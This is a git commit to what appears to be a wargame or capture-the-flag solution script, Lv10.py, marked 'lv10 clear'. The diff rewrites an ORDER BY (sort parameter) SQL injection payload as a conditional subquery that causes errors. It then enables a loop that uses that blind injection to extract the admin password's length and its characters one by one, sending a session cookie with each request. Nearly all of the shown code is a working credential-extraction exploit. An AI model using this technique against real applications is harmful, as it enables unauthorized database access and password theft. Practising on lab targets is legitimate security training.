37ad195ac96a84aacbf7702b582c93f55795aa94
Jinuk <sksmsx147@gmail.com>
2020-07-04 06:45:03 +0900

    lv10 clear

--- Week3/Lv10.py
+++ Week3/Lv10.py
@@ -10,7 +10,7 @@ length = 0
 while (1):
     length = length + 1
     query = {
-        'sort' : """asc having length(pw)>""" + str(length)
+        'sort' : ",(select case when ((select id from tb_lv10 where length(pw)="+str(length)+" and id = 'admin')='admin') then 1 else 1*(select pw from tb_lv10)end)=1"
     }
     param = parse.urlencode(query, encoding = 'UTF-8')
     Myurl = lvurl+param
@@ -30,31 +30,31 @@ while (1):
 print("length : {}".format(length))
 
 
-# password = ""
-# for k in range(length):
-#     for j in range(128):
-#         val = chr(j)
-#         if(val == '&' or val == '|' or val == '_' or val == '=' or val =='%'):
-#             continue
-#         query = {
-#             'sort' : "admin%' having left(pw,"+str(k+1)+") like '" + password + val + "'#"
-#         }
-#         param = parse.urlencode(query, encoding = 'UTF-8')
-#         Myurl = lvurl+param
-#         Myreq = req.Request(Myurl)
-#         Myreq.add_header('cookie', cookie)
-#         Myres = req.urlopen(Myreq)
-#         time.sleep(0.01)
-#         urllist = list(Myres)
-#         beforecheck = re.compile("[*][*][I][D][*]")
-#         index = 0
-#         for i in range(len(urllist)-1):
-#             if (beforecheck.search(urllist[i].decode('utf-8'))):
-#                 index = i
-#                 break
-#         idcheck = re.compile("[a][d][m][i][n]")
-#         if(idcheck.search(urllist[index+1].decode('utf-8'))):
-#             password = password + val
-#             break
-# print("password : ", end='')
-# print(password)
+password = ""
+for k in range(length):
+    for j in range(128):
+        val = chr(j)
+        if(val == '&' or val == '|' or val == '_' or val == '=' or val =='%'):
+            continue
+        query = {
+            'sort' : ",(select case when ((select id from tb_lv10 where left(pw,"+str(k+1)+") like '" + password + val + "' and id = 'admin')='admin') then 1 else 1*(select pw from tb_lv10)end)=1"
+        }
+        param = parse.urlencode(query, encoding = 'UTF-8')
+        Myurl = lvurl+param
+        Myreq = req.Request(Myurl)
+        Myreq.add_header('cookie', cookie)
+        Myres = req.urlopen(Myreq)
+        time.sleep(0.01)
+        urllist = list(Myres)
+        beforecheck = re.compile("[*][*][I][D][*]")
+        index = 0
+        for i in range(len(urllist)-1):
+            if (beforecheck.search(urllist[i].decode('utf-8'))):
+                index = i
+                break
+        idcheck = re.compile("[a][d][m][i][n]")
+        if(idcheck.search(urllist[index+1].decode('utf-8'))):
+            password = password + val
+            break
+print("password : ", end='')
+print(password)
